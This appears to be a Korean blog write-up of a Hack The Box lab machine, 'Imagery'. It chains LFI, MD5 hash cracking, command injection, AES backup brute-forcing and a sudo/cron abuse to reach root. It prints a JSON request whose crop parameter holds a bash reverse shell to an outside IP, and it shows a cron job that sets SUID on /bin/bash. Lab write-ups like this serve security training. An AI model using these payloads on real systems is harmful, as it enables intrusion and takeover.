...
date: 2025-12-10
layout: single
excerpt: "Imagery는 중간 난이도 머신으로, 웹 애플리케이션의 LFI(Local File Inclusion) 취약점을 통해 db.json 파일을 열람할 수 있으며, 이를 통해 Command Injection 취약점을 식별하고 리버스 셸을 획득할 수 있다. 이후 시스템 내 백업 디렉토리에서 AES로 암호화된 웹 애플리케이션 백업을 발견하고, 이를 복호화함으로써 mark라는 새로운 사용자 계정을 확보한다. 계정의 해시를 크랙하여 로그인한 후, mark가 루트 권한으로 charcol 프로그램을 실행할 수 있는 sudo 권한을 가지고 있음을 확인한다. 해당 프로그램은 비밀번호를 초기화할 수 있으며, 설정을 변경해 비밀번호 없는 모드로 진입한 후, 크론 작업에 악성 명령어를 삽입함으로써 SUID 비트가 설정된 /bin/bash를 이용해 최종적으로 루트 권한을 탈취할 수 있다."
author_profile: true
toc: true
toc_label: "Imagery"
toc_icon: "book"
...
**Imagery**는 중간 난이도 머신으로, 웹 애플리케이션의 **LFI(Local File Inclusion)** 취약점을 통해 `db.json` 파일을 열람할 수 있으며, 이를 통해 **Command Injection** 취약점을 식별하고 리버스 셸을 획득할 수 있다. 

이후 시스템 내 백업 디렉토리에서 **AES로 암호화된 웹 애플리케이션 백업**을 발견하고, 이를 복호화함으로써 `mark` 라는 새로운 사용자 계정을 확보한다. 

계정의 해시를 크랙하여 로그인한 후, `mark` 가 루트 권한으로 `charcol` 프로그램을 실행할 수 있는 `sudo` 권한을 가지고 있음을 확인한다. 해당 프로그램은 비밀번호를 초기화할 수 있으며, 설정을 변경해 **비밀번호 없는 모드**로 진입한 후, **크론 작업에 악성 명령어를 삽입**함으로써 SUID 비트가 설정된 `/bin/bash`를 이용해 최종적으로 루트 권한을 탈취할 수 있다.
...
![admin 대시보드](/assets/htb-linux/imagery/admin.png)
...
![.log 파일 다운로드](/assets/htb-linux/imagery/download-log.png)
...
MD5 해시 방식으로 암호화된 `testuser` 사용자의 비밀번호를 크랙한 결과, 다음과 같은 평문 비밀번호를 얻을 수 있었다:
...
`testuser` 계정으로 로그인에 성공하면, 아래와 같이 **Manage Groups** 버튼이 포함된 대시보드 화면에 접근할 수 있다:

![testuser 대시보드](/assets/htb-linux/imagery/testuser.png)

`testuser` 계정이 일반 사용자 및 관리자 계정과는 다르게, **isTestuser** 플래그가 설정된 특수 계정임을 의미한다. 해당 계정으로 로그인 시, 이미지에 대한 다양한 작업을 수행할 수 있는 기능이 활성화된다:

![다양한 작업 기능](/assets/htb-linux/imagery/testuser-option.png)

이후 **Transform Iamge**를 클릭하게 되면, 앞서 분석한 소스코드에서 확인했던 `transformType` 변수가 `Crop` 일 경우에 **Command Injection** 이 가능해지는 지점을 확인할 수 있다:

![취약한 곳 확인](/assets/htb-linux/imagery/transform.png)

**Apply Transformation** 버튼을 클릭하여 이미지를 변환한 후, `Burp Suite` 를 통해 요청 및 응답 내용을 확인하면 다음과 같은 파라미터들이 포함되어 있는 것을 볼 수 있다:

![Burp Suite](/assets/htb-linux/imagery/parameter.png)

그 후, 이전에 확인한 **Command Injection** 취약점을 이용하여, `params` 내 `x` 파라미터에 다음과 같은 리버스 셸 명령어를 삽입하였다:
...
이후, 위 `x` 파라미터에 리버스 셸을 삽입하였다:

```json
{
    "imageId":"ff8015a8-bccf-47ba-90ac-35072fe13529",
    "transformType":"crop",
    "params":{
        "x":"$(bash -c 'bash -i >& /dev/tcp/10.10.14.76/9001 0>&1')",
        "y":0,
        "width":1200,
        "height":1200
        }
...
요청을 전송하자, 서버에서 명령어가 실행되며 `web` 권한의 리버스 셸을 성공적으로 획득할 수 있었다:

![웹 셸 획득](/assets/htb-linux/imagery/web-shell.png)
...
[Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master) 도구를 활용하여 권한 상승과 관련된 시스템 정보를 열람하던 중, `/var/backup` 디렉토리에서 **AES**로 암호화된 웹 백업 압축 파일을 발견할 수 있었다:
...
`web_20250806_120723.zip.aes` 파일을 로컬로 다운로드 받은 후 `file` 명령어를 통해 분석해보면, 해당 파일이 `pyAesCrypt 6.1.1` 버전으로 암호화되어 있음을 확인할 수 있다:
...
`web_20250806_120723.zip.aes` 파일의 복호화를 위해 [dpyAesCrypt](https://github.com/Nabeelcn25/dpyAesCrypt.py) 도구를 활용하였다:
...
[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.00% | ETA: 00:00:00 | Tried 0/14344392/home/kali/htb/iamgery/dpyAesCrypt.py:42: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, password.strip(), buffer_size, os.path.getsize(encrypted_file))
[🔄] Progress: ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 0.01% | ETA: 10:44:58 | Tried 1361/14344392
...
해당 AES 암호화 파일의 패스워드는 `bestfriends` 로 확인되었으며, 복호화에 성공하여 최종적으로 압축 파일인 `web_20250806_120723.zip` 을 확보할 수 있었다.

### Discovery of mark Account 

복호화된 `web_20250806_120723.zip` 압축 파일을 풀면, `web` 디렉토리가 생성되며 그 안에는 백업 당시의 웹 애플리케이션 관련 파일들이 존재한다:
...
사용자 정보를 저장하는 `db.json` 파일을 열람하면 다음과 같이 등록된 계정들의 자격 증명이 포함되어 있다:
...
위 계정 목록 중, 이전 **LFI**를 통해 `db.json` 파일에 존재하지 않았던 `web`, `mark` 계정을 새롭게 확인할 수 있었다. 

### Hashcrack

`mark` 사용자의 MD5 해시 비밀번호를 크랙한 결과, 다음과 같은 평문 비밀번호를 얻을 수 있었다:
...
이후 `su` 명령어를 사용하여 `mark` 계정으로 전환을 시도하였고, 크랙된 비밀번호를 통해 셸을 획득에 성공하였다:
...
위 결과를 통해 `mark` 사용자는 비밀번호 입력 없이 `/usr/local/bin/charcol` 명령어를 루트 권한으로 실행할 수 있다는 것을 알 수 있다.

### Abusing charcol for Privilege Escalation

`charcol` 파일에서 `help` 명령어를 확인한 결과, `-R`, `--reset-password-to-default` 옵션을 통해 비밀번호를 초기화할 수 있는 기능이 존재함을 확인할 수 있었다:
...
`mark` 의 비밀번호를 이용하여 `charcol` CLI 도구의 비밀번호를 초기화하는 데 성공하였다:
...
이후 `shell` 명령어를 다시 실행한 뒤, 비밀번호 없이 실행되는 **no password mode** 로 설정하였다:
...
다시 `sudo /usr/local/bin/charcol shell` 명령어를 통해 `charcol` 인터페이스로 진입한 후, `help` 명령어를 입력하여 사용 가능한 명령어 목록을 확인하였다:
...
위와 같이 `auto add` 명령을 통해 **Cron 기반 자동 작업을 추가**할 수 있으며, `--command` 옵션을 통해 원하는 셸 명령을 실행하도록 설정할 수 있다.

매 분마다 실행되는 `chmod +s /bin/bash` 명령어를 `root-shell` 이름으로 등록하였고, 다음과 같이 작업이 성공적으로 추가된 것을 확인할 수 있었다:
...
일정 시간이 지난 뒤 `/bin/bash` 파일의 권한을 확인해보면, SUID 비트가 정상적으로 설정된 것을 확인할 수 있다:
...
이후, `-p` 옵션을 이용하여 `/bin/bash` 명령어를 실행하면 루트 권한의 셸을 획득하는 데 성공하였다:
...
![루트 플래그 획득](/assets/htb-linux/imagery/flag.png)